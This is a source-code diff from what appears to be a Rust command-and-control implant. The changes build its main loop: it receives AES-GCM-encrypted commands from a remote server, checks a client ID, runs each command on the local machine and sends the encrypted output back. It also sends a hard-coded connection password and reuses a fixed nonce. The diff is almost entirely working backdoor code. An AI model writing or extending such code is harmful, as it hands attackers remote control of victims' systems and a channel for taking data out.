@@ -7,6 +7,7 @@
 use super::{ps_functions, messages, command_wrapper};
 use std::io::{Read, Write};
 mod connection_helper;
+mod command_msg;
 
 // This is only here beacause I need to call it in the main function
 pub fn convert_ip_port_to_sockaddr(server_addr: &str, server_port: &str) -> std::net::SocketAddr {
@@ -84,10 +85,10 @@ pub async fn init_conn_with_server(server_addr: &str, server_port: &str, init_co
             }
             
             // Send the initlization connection key
-            match stream.write(messages::CLIENT_INIT_CONN_KEY_MSG) {
+            match stream.write(messages::INIT_CONNECTION_PASS.as_bytes()) {
 
                 Ok(_) => {
-                    println!("[+] Send initlization key to the server")
+                    println!("[+] Send CLIENT_INIT_CONN_KEY_MSG: {}", messages::INIT_CONNECTION_PASS)
                 }
                 Err(e) => {
 
@@ -176,6 +177,10 @@ pub async fn commands_communication_handler(server_addr: &str, server_port: &str
     // Temp Buffer (TODO Change later)
     let mut buffer: [u8; 8192]   = [0; 8192];
 
+    // AES256 Vars
+    let communication_key: &[u8]  = commands_secret.as_bytes();
+    let communication_nonce: &[u8]  = nonce.as_bytes();
+
     let com_sock_addr: std::net::SocketAddr = convert_ip_port_to_sockaddr(server_addr, server_port);
 
 
@@ -196,15 +201,74 @@ pub async fn commands_communication_handler(server_addr: &str, server_port: &str
                 Ok(command_data) if command_data > 0 => {
 
                     let server_command: std::borrow::Cow<'_, str> = String::from_utf8_lossy(&buffer[..command_data]);
-                    // If the command message uses the correct form: COMMAND_MSG:
-                    if server_command.to_string().starts_with(std::str::from_utf8(messages::COMMAND_MSG).unwrap()) {
 
-                        // Decrypt the command
+                    // Decrypt the command message
+                    let decrypted_server_command: Vec<u8> = connection_helper::aes_gcm_decrypt(
+                        communication_key, communication_nonce, server_command.as_bytes());
+                    
+                    // Convert the decrypted command to std::borrow::Cow<'_, str>
+                    let decrypted_server_command_str: std::borrow::Cow<'_, str> = String::from_utf8_lossy(&decrypted_server_command);
+                    
+                    // Define a CommandMessage struct that will hold the message info later
+                    let mut server_command_com_msg: command_msg::CommandMessage = command_msg::CommandMessage::new_empty();
+
+                    // Parse the message into the CommandMessage Struct
+                    match command_msg::parse_str_msg_to_command_msg(decrypted_server_command_str.to_string().as_str()) {
                         
-                        command_wrapper::excute_server_command()
+                        Ok(command_message) => server_command_com_msg = command_message,
+                        Err(e) => {
+
+                            println!("[+] Entering the heartbeat state after the error: {}", e);
+                            heartbeat(com_sock_addr, messages::MISCONNECTION_OR_MISCOMMUNICATION).await?;
+                        }
                     }
+
+                    // If the command message uses the correct form check the client id
+                    if server_command_com_msg.client_id == messages::INIT_CONNECTION_PASS.split(':').next().unwrap() {
+
+                        println!("[+] The client ID is correct sending the command to the execution phase");
+                        
+                        // Execute the command on the client and save the result in client_resp
+                        let client_resp: String = command_wrapper::excute_server_command(server_command_com_msg.command_msg.as_str());
+
+                        // build the response message
+                        let client_resp_msg: command_msg::CommandResponse = command_msg::CommandResponse::new(
+                            messages::INIT_CONNECTION_PASS.split(':').next().unwrap().to_string(),
+                             client_resp.clone()
+                        );
+
+                        // Encrypt the client response message
+                        let (ecrytped_client_resp_msg, _) = connection_helper::aes_gcm_encrypt(
+                            messages::COMMANMD_COMMUNICATION_SECRET.as_bytes(),
+                            messages::NONCE.as_bytes(),
+                            &client_resp_msg.to_bytes()
+                        );
+
+
+                        match commands_stream.write(&ecrytped_client_resp_msg) {
+
+                            Ok(_) => println!("[+] Command Response Message: {} is sent", client_resp.clone()),
+                            Err(e) => {
+                                
+                                println!("[-] Error: Could not send the command response to the server {}", e);
+                                println!("[!] Entering heartbeat state...");
+                                heartbeat(com_sock_addr, messages::MISCONNECTION_OR_MISCOMMUNICATION).await?;
+                            }
+                        };
+
+                    } else {
+
+                        println!("[+] Error: Command client id does not match the current client id... Entering heartbeat status");
+                        heartbeat(com_sock_addr, messages::MISCONNECTION_OR_MISCOMMUNICATION).await?;
+                    }
+
                 },
-                Ok(_) => {},
+                Ok(_) => {
+
+                    println!("[!] Something went wrong with reading the command from the server!\n [+] Entering the heartbeat state!");
+                    heartbeat(com_sock_addr, messages::MISCONNECTION_OR_MISCOMMUNICATION).await?;
+
+                },
                 Err(e) => {
 
                     println!("[-] Error: cannot read the server command {}", e);
@@ -213,29 +277,6 @@ pub async fn commands_communication_handler(server_addr: &str, server_port: &str
             }
         }
     }
-
-    /*
-    println!("{}", sock_address);
-
-    let key: &[u8] = commands_secret.as_bytes();
-    let nonce: &[u8] = nonce.as_bytes();
-    let plaintext: &'static [u8; 12] = b"Hello world!";
-
-    // Example using GCM mode
-    let (gcm_ciphertext, nonce) = connection_helper::aes_gcm_encrypt(key, nonce, plaintext);
-    
-    println!("=== Encryption Results ===");
-    println!("Nonce (hex): {}", hex::encode(&nonce));
-    println!("Ciphertext (hex): {}", hex::encode(&gcm_ciphertext));
-
-    let gcm_decrypted: Vec<u8> = connection_helper::aes_gcm_decrypt(key, &nonce, &gcm_ciphertext);
-    
-    println!("GCM Decrypted: {}", String::from_utf8_lossy(&gcm_decrypted));
-
-
-    // TDOD
-    println!("THis is command handler");
-    */
 
     Ok(())
 }
